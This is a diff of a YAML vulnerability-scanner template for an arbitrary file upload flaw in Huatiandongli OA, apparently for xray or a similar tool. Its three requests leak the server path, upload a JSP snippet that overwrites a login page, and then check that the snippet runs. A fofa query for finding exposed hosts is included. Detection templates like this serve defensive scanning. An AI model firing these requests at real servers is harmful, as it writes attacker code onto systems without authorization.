@@ -1,68 +1,62 @@
+expression: r0() && r1() && r2()
 id: huatiandongli-oa-anyfile-upload
-
 info:
-  name: 华天动力 OA 任意文件上传漏洞
   author: daffainfo
+  description: "\u534E\u5929\u52A8\u529B\u534F\u540C\u529E\u516C\u7CFB\u7EDF\u5C06\
+    \u5148\u8FDB\u7684\u7BA1\u7406\u601D\u60F3\u3001\u7BA1\u7406\u6A21\u5F0F\u548C\
+    \u8F6F\u4EF6\u6280\u672F\u3001\u7F51\u7EDC\u6280\u672F\u76F8\u7ED3\u5408\uFF0C\
+    \u4E3A\u7528\u6237\u63D0\u4F9B\u4E86\u4F4E\u6210\u672C\u3001\u9AD8\u6548\u80FD\
+    \u7684\u534F\u540C\u529E\u516C\u548C\u7BA1\u7406\u5E73\u53F0\u3002\u777F\u667A\
+    \u7684\u7BA1\u7406\u8005\u901A\u8FC7\u4F7F\u7528\u534E\u5929\u52A8\u529B\u534F\
+    \u540C\u529E\u516C\u5E73\u53F0\uFF0C\u5728\u52A0\u5F3A\u89C4\u8303\u5DE5\u4F5C\
+    \u6D41\u7A0B\u3001\u5F3A\u5316\u56E2\u961F\u6267\u884C\u3001\u63A8\u52A8\u7CBE\
+    \u7EC6\u7BA1\u7406\u3001\u4FC3\u8FDB\u8425\u4E1A\u589E\u957F\u7B49\u5DE5\u4F5C\
+    \u4E2D\u53D6\u5F97\u4E86\u826F\u597D\u7684\u6210\u6548\u3002\u534E\u5929\u52A8\
+    \u529BOA\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\
+    \u51FB\u8005\u53EF\u4EE5\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\uFF0C\u83B7\u53D6\
+    webshell\uFF0C\u63A7\u5236\u670D\u52A1\u5668\u6743\u9650\uFF0C\u8BFB\u53D6\u654F\
+    \u611F\u4FE1\u606F\u7B49\u3002\nfofa-query: body=\"/OAapp/WebObjects/OAapp.woa\"\
+    \ || body=\"/OAapp/htpages/app\"\n"
+  name: "\u534E\u5929\u52A8\u529B OA \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E"
+  reference:
+  - https://mp.weixin.qq.com/s/Ite0aOtRp9SPrh4h8yNQwQ
   severity: critical
   verified: true
-  description: |-
-    华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。华天动力OA存在任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。
-    fofa: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
-  reference:
-    - https://mp.weixin.qq.com/s/Ite0aOtRp9SPrh4h8yNQwQ
-  tags: huatiandongli,oa,anyfile,upload
-  created: 2025/08/06
-
-set:
-  randomStr: randomLowercase(12)
-  rboundary: randomLowercase(8)
 rules:
   r0:
-    request:
-      method: POST
-      path: /OAapp/jsp/upload.jsp
-      headers:
-        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
-      body: "\
-        ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"file\"; filename=\"xxx.xml\"\r\n\
-        Content-Type: image/png\r\n\
-        \r\n\
-        real path\r\n\
-        ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"filename\"\r\n\
-        \r\n\
-        xxx.png\r\n\
-        ------WebKitFormBoundary{{rboundary}}--\r\n\
-        "
     expression: response.status == 200 && response.body.bcontains(b'FILE') && response.body.bcontains(b'webapps')
     output:
-      search: '"(?P<path>.+)/webapps".bsubmatch(response.body)'
       path: search["path"]
-  r1:
+      search: '"(?P<path>.+)/webapps".bsubmatch(response.body)'
     request:
+      body: "------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data;\
+        \ name=\"file\"; filename=\"xxx.xml\"\r\nContent-Type: image/png\r\n\r\nreal\
+        \ path\r\n------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition:\
+        \ form-data; name=\"filename\"\r\n\r\nxxx.png\r\n------WebKitFormBoundary5Ur8laykKAWws2QO--\r\
+        \n"
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
+      method: POST
+      path: /OAapp/jsp/upload.jsp
+  r1:
+    expression: response.status == 200
+    request:
+      body: "------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data;\
+        \ name=\"EDITFILE\"; filename=\"xxx.txt\"\r\nContent-Type: image/png\r\n\r\
+        \n<%out.print(\"{{randomStr}}\");%>\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\
+        \nContent-Disposition: form-data; name=\"newFileName\"\r\n\r\n{{path}}/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r\
+        \n------WebKitFormBoundaryzRSYXfFlXqk6btQm--\r\n"
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
       method: POST
       path: /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp
-      headers:
-        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
-      body: "\
-        ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"EDITFILE\"; filename=\"xxx.txt\"\r\n\
-        Content-Type: image/png\r\n\
-        \r\n\
-        <%out.print(\"{{randomStr}}\");%>\r\n\
-        ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"newFileName\"\r\n\
-        \r\n\
-        {{path}}/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r\n\
-        ------WebKitFormBoundary{{rboundary}}--\r\n\
-        "
-    expression: response.status == 200
   r2:
+    expression: response.status == 200 && (response.body.bcontains(bytes(randomStr))
+      || response.body.bcontains(b'5DBB70'))
     request:
-      method: GET
-      path: /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
       headers:
         Cookie: JSESSIONID=63A1AF6B0B60634BF5B8E71AB4D88B85
-    expression: response.status == 200 && (response.body.bcontains(bytes(randomStr)) || response.body.bcontains(b'5DBB70'))
-expression: r0() && r1() && r2()
+      method: GET
+      path: /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
+set:
+  randomStr: randomLowercase(12)
